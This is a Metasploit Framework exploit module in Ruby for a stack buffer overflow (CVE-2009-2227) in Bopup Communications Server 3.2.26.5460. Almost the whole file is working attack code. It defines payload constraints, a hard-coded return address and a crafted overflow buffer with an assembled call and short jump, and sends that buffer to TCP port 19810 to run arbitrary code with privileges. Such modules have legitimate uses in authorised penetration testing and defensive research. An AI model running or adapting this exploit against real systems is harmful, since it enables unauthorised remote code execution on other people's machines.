##
# $Id: bopup_comm.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Bopup Communications Server Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Bopup Communications Server 3.2.26.5460.
					By sending a specially crafted packet, an attacker may be
					able to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2009-2227' ],
					[ 'OSVDB', '55275' ],
					[ 'URL', 'http://www.blabsoft.com/products/server' ],
					[ 'URL', 'http://milw0rm.com/exploits/9002' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 417,
					'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Bopup Communications Server 3.2.26.5460',   { 'Ret' => 0x0041add2 } ],
				],
			'Privileged'     => true,
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 18 2009'))

		register_options(
			[
				Opt::RPORT(19810)
			], self.class)
	end

	def exploit
		connect

		sploit =  [0x00000001].pack('V')
		sploit << rand_text_alpha_upper(829 - payload.encoded.length)
		sploit << payload.encoded
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "call $-380").encode_string
		sploit << rand_text_alpha_upper(27)
		sploit << Rex::Arch::X86.jmp_short(222) + rand_text_english(2)
		sploit << [target.ret].pack('V')

		print_status("Trying target #{target.name}...")
		sock.put(sploit)

		handler
		disconnect
	end

end
